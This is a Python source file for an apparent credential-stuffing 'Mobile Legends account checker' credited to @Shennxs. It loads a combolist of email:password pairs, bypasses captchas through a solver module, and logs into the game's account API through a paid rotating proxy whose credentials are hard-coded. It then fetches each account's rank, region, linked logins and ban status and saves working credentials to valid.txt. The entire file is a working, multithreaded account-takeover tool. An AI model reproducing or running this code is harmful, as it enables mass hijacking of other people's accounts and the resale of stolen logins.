import hashlib
import json
import time
import threading
from concurrent.futures import ThreadPoolExecutor
import os
import sys
import queue
from tqdm import tqdm
from colorama import init, Fore, Style
import logging
from curl_cffi import requests
from solver import start_solver, get_cn31_token

init(autoreset=True)

logging.getLogger('tqdm').setLevel(logging.ERROR)

ACCOUNT_API = 'https://accountmtapi.mobilelegends.com/'
PROXY = os.environ.get('PROXY', 'http://262ceb93fc50f42b5029__cr.gb,us,vn,br:56c174ad8eb0f6c2@gw.dataimpulse.com:823')
USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'

file_lock = threading.Lock()
valid_count = 0
invalid_count = 0
checked_count = 0
banned_count = 0
total_accounts = 0
start_time = None
_result_queue = queue.Queue()

def generate_sign(username, md5pwd, cn31):
    params_str = f"account={username}&country=&e_captcha={cn31}&game_token=&md5pwd={md5pwd}&recaptcha_token="
    return hashlib.md5((params_str + "&op=login").encode()).hexdigest().lower()

RANK_RANGES = [
    {"min": 0, "max": 4, "rank": "Warrior III"},
    {"min": 5, "max": 9, "rank": "Warrior II"},
    {"min": 10, "max": 14, "rank": "Warrior I"},
    {"min": 15, "max": 19, "rank": "Elite IV"},
    {"min": 20, "max": 24, "rank": "Elite III"},
    {"min": 25, "max": 29, "rank": "Elite II"},
    {"min": 30, "max": 34, "rank": "Elite I"},
    {"min": 35, "max": 39, "rank": "Master IV"},
    {"min": 40, "max": 44, "rank": "Master III"},
    {"min": 45, "max": 49, "rank": "Master II"},
    {"min": 50, "max": 54, "rank": "Master I"},
    {"min": 55, "max": 59, "rank": "Grandmaster IV"},
    {"min": 60, "max": 64, "rank": "Grandmaster III"},
    {"min": 65, "max": 69, "rank": "Grandmaster II"},
    {"min": 70, "max": 74, "rank": "Grandmaster I"},
    {"min": 75, "max": 79, "rank": "Epic IV"},
    {"min": 80, "max": 84, "rank": "Epic III"},
    {"min": 85, "max": 89, "rank": "Epic II"},
    {"min": 90, "max": 94, "rank": "Epic I"},
    {"min": 95, "max": 99, "rank": "Legend IV"},
    {"min": 100, "max": 104, "rank": "Legend III"},
    {"min": 105, "max": 109, "rank": "Legend II"},
    {"min": 110, "max": 114, "rank": "Legend I"},
    {"min": 115, "max": 119, "rank": "Mythic V"},
    {"min": 120, "max": 124, "rank": "Mythic IV"},
    {"min": 125, "max": 129, "rank": "Mythic III"},
    {"min": 130, "max": 134, "rank": "Mythic II"},
    {"min": 135, "max": 139, "rank": "Mythic I"},
    {"min": 140, "max": 199, "rank": "Mythical Honor"},
    {"min": 200, "max": 999, "rank": "Mythical Glory"}
]

def get_rank_name(history_rank_level):
    try:
        history_rank_level = int(history_rank_level)
        for rank in RANK_RANGES:
            if rank["min"] <= history_rank_level <= rank["max"]:
                return rank["rank"]
        return "Unknown"
    except:
        return "Unranked"



def get_token(guid, sess, session):
    url = "https://api.mobilelegends.com/tools/deleteaccount/getToken"
    payload = {"id": guid, "token": sess, "type": "mt_And"}

    try:
        res = session.post(url, json=payload, timeout=10)
        result = res.json()
        if result.get("status") == "success" and "data" in result:
            return result["data"].get("jwt")
        return None
    except:
        return None

def check_ban_status(jwt_token, session):
    """Check if account is banned using the self-service API"""
    url = "https://api.mobilelegends.com/tools/selfservice/punishList"
    headers = {
        'authorization': f'Bearer {jwt_token}',
        'content-type': 'application/json',
        'user-agent': USER_AGENT,
        'x-token': jwt_token,
        'origin': 'https://play.mobilelegends.com',
        'referer': 'https://play.mobilelegends.com/'
    }

    # Add the required payload
    payload = {"lang": "en"}

    try:
        res = session.post(url, headers=headers, json=payload, timeout=10)
        if res.status_code != 200:
            return {"is_banned": False, "ban_info": None}

        response_data = res.json()

        # Check if there are any punishment records based on your API response example
        if response_data.get("status") == "success" and response_data.get("code") == 0 and "data" in response_data:
            punishment_list = response_data["data"]

            if punishment_list and len(punishment_list) > 0:
                # Account has punishment records
                active_bans = []
                for punishment in punishment_list:
                    # Parse dates from the format "2024.09.20" and "2054.09.13"
                    violation_time = punishment.get("violation_time", "")
                    unlock_time = punishment.get("unlock_time", "")

                    # Check if ban is still active by comparing unlock_time with current date
                    is_active = True
                    if unlock_time:
                        try:
                            from datetime import datetime
                            unlock_date = datetime.strptime(unlock_time, "%Y.%m.%d")
                            current_date = datetime.now()
                            is_active = current_date < unlock_date
                        except:
                            is_active = True  # Assume active if we can't parse date

                    ban_info = {
                        "id": punishment.get("id", "Unknown"),
                        "reason": punishment.get("reason", "Unknown"),
                        "violation_time": violation_time,
                        "unlock_time": unlock_time,
                        "is_appeal": punishment.get("is_appeal", -1),
                        "is_active": is_active
                    }

                    if ban_info["is_active"]:
                        active_bans.append(ban_info)

                if active_bans:
                    return {"is_banned": True, "ban_info": active_bans}
                else:
                    return {"is_banned": False, "ban_info": punishment_list}  # Had bans but expired
            else:
                return {"is_banned": False, "ban_info": None}
        else:
            return {"is_banned": False, "ban_info": None}

    except Exception as e:
        return {"is_banned": False, "ban_info": None}

def get_info(jwt_token, session):
    url = "https://sg-api.mobilelegends.com/base/getBaseInfo"
    headers = {
        'authorization': f'Bearer {jwt_token}',
        'content-type': 'application/json',
        'user-agent': USER_AGENT,
        'x-token': jwt_token
    }

    try:
        res = session.post(url, headers=headers, json={}, timeout=10)
        if res.status_code != 200:
            return None

        data = res.json()
        if data.get("code") != 0:
            return None

        user = data.get("data", {})
        return {
            "nn": user.get("name", "N/A"),
            "reg": user.get("reg_country", "N/A"),
            "rid": user.get("roleId", "N/A"),
            "zid": user.get("zoneId", "N/A"),
            "pic": user.get("avatar", "N/A"),
            "lvl": user.get("level", "N/A"),
            "history_rank_level": user.get("history_rank_level", "N/A"),
            "rank_name": get_rank_name(user.get("history_rank_level", "N/A"))
        }
    except:
        return None

def get_bind_info(jwt_token, session):
    """Get account bind information (Google, Moonton, Facebook)"""
    url = "https://api.mobilelegends.com/tools/deleteaccount/getCancelAccountInfo"
    headers = {
        'authorization': f'Bearer {jwt_token}',
        'content-type': 'application/json',
        'user-agent': USER_AGENT,
        'x-token': jwt_token,
        'origin': 'https://play.mobilelegends.com',
        'referer': 'https://play.mobilelegends.com/'
    }

    try:
        res = session.post(url, headers=headers, json={}, timeout=10)
        if res.status_code != 200:
            return "N/A"

        data = res.json()
        if data.get("status") != "success" or data.get("code") != 0:
            return "N/A"

        bind_emails = data.get("data", {}).get("bind_email", [])
        
        # Map bind types to readable names
        bind_types = []
        for bind_type in bind_emails:
            if bind_type == "mt-and_":
                bind_types.append("Moonton")
            elif bind_type == "gg_":
                bind_types.append("Google")
            elif bind_type == "fb-and_":
                bind_types.append("Facebook")
        
        if bind_types:
            return ", ".join(bind_types)
        return "None"
    except:
        return "N/A"

def save_valid_account(em, pw, info):
    """Save valid (non-banned) accounts with full info to valid.txt"""
    with file_lock:
        with open('valid.txt', 'a', encoding='utf-8') as f:
            f.write(f"{em}:{pw} | Name: {info['nn']} | Level: {info['lvl']} | Rank: {info['rank_name']} | Region: {info['reg']} | UID: {info['rid']} ({info['zid']}) | Bind: {info['bind_info']} | Banned: False | Config By = @Shennxs\n")

def save_banned_account(em, pw, info, ban_status):
    """Save banned accounts to banned_accounts.txt"""
    ban_text = " | Banned: Unknown"
    if ban_status["ban_info"]:
        ban_details = ban_status["ban_info"][0]  # Get first active ban
        reason = ban_details.get('reason', 'Unknown')
        violation_time = ban_details.get('violation_time', 'Unknown')
        unlock_time = ban_details.get('unlock_time', 'Unknown')
        ban_text = f" | Banned: {reason} ({violation_time}/{unlock_time})"

    with file_lock:
        with open('banned_accounts.txt', 'a', encoding='utf-8') as f:
            f.write(f"{em}:{pw} | Name: {info['nn']} | Level: {info['lvl']} | Rank: {info['rank_name']} | Region: {info['reg']} | UID: {info['rid']} ({info['zid']}) | Bind: {info['bind_info']}{ban_text} | Config By = @Shennxs\n")

def save_failed_account(em, pw, error_reason):
    """Save accounts that failed to get info (N/A values)"""
    with file_lock:
        with open('failed.txt', 'a', encoding='utf-8') as f:
            f.write(f"{em}:{pw} | ERROR: {error_reason} | Config By = @Shennxs\n")

def save_invalid_account(em, pw):
    """Save invalid accounts to invalid_accounts.txt"""
    with file_lock:
        with open('invalid_accounts.txt', 'a', encoding='utf-8') as f:
            f.write(f"{em}:{pw}\n")

def get_elapsed_time():
    if start_time:
        elapsed = time.time() - start_time
        hours, remainder = divmod(elapsed, 3600)
        minutes, seconds = divmod(remainder, 60)
        return f"{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}"
    return "00:00:00"

def get_checking_rate():
    if start_time and checked_count > 0:
        elapsed = time.time() - start_time
        rate = checked_count / elapsed
        return f"{rate:.1f}/s"
    return "0.0/s"

def update_progress_bar(pbar):
    if pbar is None:
        return
    try:
        success_rate = (valid_count / checked_count * 100) if checked_count > 0 else 0
        remaining = total_accounts - checked_count

        if checked_count > 0 and start_time:
            elapsed = time.time() - start_time
            avg_time_per_check = elapsed / checked_count
            eta_seconds = remaining * avg_time_per_check
            eta_hours, eta_remainder = divmod(eta_seconds, 3600)
            eta_minutes, eta_seconds = divmod(eta_remainder, 60)
            eta = f"{int(eta_hours):02d}:{int(eta_minutes):02d}:{int(eta_seconds):02d}"
        else:
            eta = "00:00:00"

        pbar.n = checked_count
        pbar.set_description(f"🔍 [{checked_count}/{total_accounts}]")
        pbar.set_postfix({
            "✅": f"{valid_count}",
            "❌": f"{invalid_count}",
            "🚫": f"{banned_count}",
            "📊": f"{success_rate:.1f}%",
            "⏱️": get_elapsed_time(),
            "📈": get_checking_rate(),
            "ETA": eta
        })
    except Exception:
        pass

def check_account(email, password):
    global valid_count, invalid_count, banned_count

    try:
        time.sleep(0.3)

        cn31_token = get_cn31_token()
        md5pwd = hashlib.md5(password.encode()).hexdigest().upper()
        sign = generate_sign(email, md5pwd, cn31_token)
        session = requests.Session()
        r = session.get("https://mtacc.mobilelegends.com/v2.1/inapp/login-new", impersonate="chrome120", timeout=30)
        try:
            for cookie in r.cookies:
                session.cookies.set(cookie.name, cookie.value, domain=".mobilelegends.com")
        except:
            pass

        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://mtacc.mobilelegends.com",
            "Referer": "https://mtacc.mobilelegends.com/",
            "User-Agent": USER_AGENT,
        }

        body = {
            "op": "login",
            "sign": sign,
            "params": {
                "account": email,
                "md5pwd": md5pwd,
                "game_token": "",
                "recaptcha_token": "",
                "e_captcha": cn31_token,
                "country": "",
            },
            "lang": "en",
        }

        login_res = session.request("PUT", ACCOUNT_API, json=body, headers=headers, impersonate="chrome120", timeout=30)

        if login_res.status_code != 200:
            raise Exception(f"HTTP {login_res.status_code}: {login_res.text[:200]}")

        try:
            data = login_res.json()
        except json.JSONDecodeError:
            raise Exception("Invalid JSON response from server")

        message = data.get("message", "")
        code = data.get("code", "")

        if message == "Error_Success":
            login_data = data.get("data", {})
            guid = login_data.get("guid")
            sess = login_data.get("session")

            if guid and sess:
                jwt_token = get_token(guid, sess, session)
                if jwt_token:
                    account_info = get_info(jwt_token, session)
                    if account_info:
                        bind_info = get_bind_info(jwt_token, session)
                        account_info["bind_info"] = bind_info

                        ban_status = check_ban_status(jwt_token, session)

                        if ban_status["is_banned"]:
                            with file_lock:
                                banned_count += 1
                            _result_queue.put(f"{Fore.YELLOW}[BANNED] - {email} - {account_info['nn']}{Style.RESET_ALL}")
                            save_banned_account(email, password, account_info, ban_status)
                        else:
                            with file_lock:
                                valid_count += 1
                            _result_queue.put(f"{Fore.GREEN}[VALID] - {email} - {account_info['nn']}{Style.RESET_ALL}")
                            save_valid_account(email, password, account_info)
                        return
                    else:
                        save_failed_account(email, password, "Failed to get account info")
                        with file_lock:
                            invalid_count += 1
                        _result_queue.put(f"{Fore.CYAN}[FAILED] - {email} - Info unavailable{Style.RESET_ALL}")
                        return
                else:
                    save_failed_account(email, password, "Failed to get JWT token")
                    with file_lock:
                        invalid_count += 1
                    _result_queue.put(f"{Fore.CYAN}[FAILED] - {email} - Token unavailable{Style.RESET_ALL}")
                    return
            else:
                save_failed_account(email, password, "No GUID or session in response")
                with file_lock:
                    invalid_count += 1
                _result_queue.put(f"{Fore.CYAN}[FAILED] - {email} - Session unavailable{Style.RESET_ALL}")
                return
        else:
            with file_lock:
                invalid_count += 1
            _result_queue.put(f"{Fore.RED}[INVALID] - {email}{Style.RESET_ALL}")
            save_invalid_account(email, password)
            return

    except Exception as e:
        with file_lock:
            invalid_count += 1
        _result_queue.put(f"{Fore.RED}[ERROR] - {email} - {str(e)[:100]}{Style.RESET_ALL}")
        save_invalid_account(email, password)

def worker_wrapper(email, password):
    global checked_count

    try:
        check_account(email, password)
    except Exception as e:
        with file_lock:
            global invalid_count
            invalid_count += 1
        _result_queue.put(f"{Fore.RED}[WORKER ERROR] - {email} - {str(e)}{Style.RESET_ALL}")
        save_invalid_account(email, password)
    finally:
        with file_lock:
            checked_count += 1
        _result_queue.put("__UPDATE_BAR__")

def print_header():
    print(f"{Fore.CYAN}{Style.BRIGHT}")
    print("=" * 80)
    print("🎮 MOBILE LEGENDS ACCOUNT CHECKER v2.0")
    print("💻 Enhanced with Real-time Progress Tracking")
    print("👨‍💻 Coded by @Shennxs")
    print("=" * 80)
    print(f"{Style.RESET_ALL}")

def main():
    global total_accounts, valid_count, invalid_count, banned_count, checked_count, start_time
    print_header()

    # Clear previous results
    for filename in ['valid.txt', 'invalid_accounts.txt', 'banned_accounts.txt', 'failed.txt']:
        if os.path.exists(filename):
            os.remove(filename)

    # Get input file
    while True:
        file_path = input(f"{Fore.YELLOW}📁 Enter path to your accounts file (e.g., combolist.txt): {Style.RESET_ALL}").strip()
        if os.path.exists(file_path):
            break
        else:
            print(f"{Fore.RED}❌ File '{file_path}' not found. Please enter a valid file path.{Style.RESET_ALL}")

    # Load accounts
    with open(file_path, "r", encoding='utf-8') as f:
        lines = f.read().splitlines()

    accounts = []
    for line in lines:
        if ':' in line and line.strip():
            email, password = line.split(':', 1)
            accounts.append((email.strip(), password.strip()))

    total_accounts = len(accounts)
    if total_accounts == 0:
        print(f"{Fore.RED}❌ No valid accounts found in the file{Style.RESET_ALL}")
        return

    print(f"{Fore.GREEN}📋 Found {total_accounts} accounts to check{Style.RESET_ALL}")

    # Get solver thread count
    default_solver_threads = min(10, total_accounts)
    while True:
        try:
            solver_threads = int(input(f"{Fore.YELLOW}🔧 Enter number of solver threads (default: {default_solver_threads}): {Style.RESET_ALL}") or str(default_solver_threads))
            if 1 <= solver_threads <= 200:
                break
            else:
                print(f"{Fore.RED}⚠️  Please enter a number between 1 and 200{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}⚠️  Please enter a valid number{Style.RESET_ALL}")

    print(f"\n{Fore.CYAN}🚀 Initializing solver with {solver_threads} threads...{Style.RESET_ALL}")
    if not start_solver(solver_threads):
        print(f"{Fore.RED}❌ Failed to initialize solver{Style.RESET_ALL}")
        return
    print(f"{Fore.GREEN}✅ Solver initialized{Style.RESET_ALL}")

    # Get checker thread count
    recommended_threads = min(50, total_accounts, os.cpu_count() * 4)
    while True:
        try:
            max_workers = int(input(f"{Fore.YELLOW}🔧 Enter number of checker threads (1-{min(800, total_accounts)}, recommended: {recommended_threads}): {Style.RESET_ALL}"))
            if 1 <= max_workers <= min(800, total_accounts):
                break
            else:
                print(f"{Fore.RED}⚠️  Please enter a number between 1 and {min(800, total_accounts)}{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}⚠️  Please enter a valid number{Style.RESET_ALL}")

    print(f"\n{Fore.CYAN}🚀 Starting account validation with {max_workers} checker threads + {solver_threads} solver threads...{Style.RESET_ALL}", flush=True)
    print(f"{Fore.CYAN}📊 Progress will be shown in the progress bar below{Style.RESET_ALL}", flush=True)
    print("-" * 80, flush=True)

    start_time = time.time()
    pbar = None

    try:
        try:
            pbar = tqdm(
                total=total_accounts,
                desc="🔍 Initializing...",
                unit="acc",
                ncols=120,
                dynamic_ncols=False,
                bar_format="{l_bar}{bar}| {postfix}",
                colour='green',
                position=0,
                leave=True,
                smoothing=0.1,
                mininterval=0.1,
                maxinterval=1.0
            )
        except Exception as e:
            print(f"\n⚠️  Progress bar unavailable ({e})", flush=True)
            pbar = None

        done_count = 0
        executor = ThreadPoolExecutor(max_workers=max_workers)
        _interrupted = False
        try:
            for email, password in accounts:
                executor.submit(worker_wrapper, email, password)

            while done_count < len(accounts):
                try:
                    msg = _result_queue.get(timeout=60)
                    if msg == "__UPDATE_BAR__":
                        done_count += 1
                        update_progress_bar(pbar)
                    else:
                        tqdm.write(msg)
                except queue.Empty:
                    pass
        except KeyboardInterrupt:
            _interrupted = True
        finally:
            executor.shutdown(wait=not _interrupted, cancel_futures=True)
            if _interrupted:
                try:
                    pbar.close()
                except Exception:
                    pass
                print(f"{Fore.YELLOW}⏹️  STOPPED BY USER{Style.RESET_ALL}", flush=True)
                os._exit(0)
    except Exception as e:
        print(f"\n[MAIN LOOP CRASH] {e}", flush=True)
        import traceback
        traceback.print_exc()
    finally:
        try:
            pbar.close()
        except:
            pass

    elapsed_total = get_elapsed_time()
    final_rate = get_checking_rate()
    success_rate = (valid_count / checked_count * 100) if checked_count > 0 else 0

    print(f"\n\n{Fore.CYAN}{Style.BRIGHT}{'=' * 60}")
    print(f"🎯 CHECKING COMPLETE!")
    print(f"{'=' * 60}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}✅ Valid accounts: {valid_count}")
    print(f"{Fore.RED}❌ Invalid accounts: {invalid_count}")
    print(f"{Fore.YELLOW}🚫 Banned accounts: {banned_count}")
    print(f"{Fore.BLUE}📊 Total checked: {checked_count}")
    print(f"{Fore.YELLOW}🎯 Success rate: {success_rate:.1f}%")
    print(f"{Fore.MAGENTA}⏱️ Total time: {elapsed_total}")
    print(f"{Fore.CYAN}📈 Average rate: {final_rate}")
    print(f"{Fore.WHITE}📁 Results saved to:")
    print(f"{Fore.GREEN}  • valid.txt - Clean accounts with full info")
    print(f"{Fore.RED}  • invalid_accounts.txt - Invalid login credentials")
    if banned_count > 0:
        print(f"{Fore.YELLOW}  • banned_accounts.txt - Banned accounts")
    print(f"{Fore.CYAN}  • failed.txt - Accounts that failed to get info")
    print(f"{Style.RESET_ALL}")

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print(f"\n[CRASH] Unhandled exception: {e}")
        import traceback
        traceback.print_exc()
        input("\nPress Enter to exit...")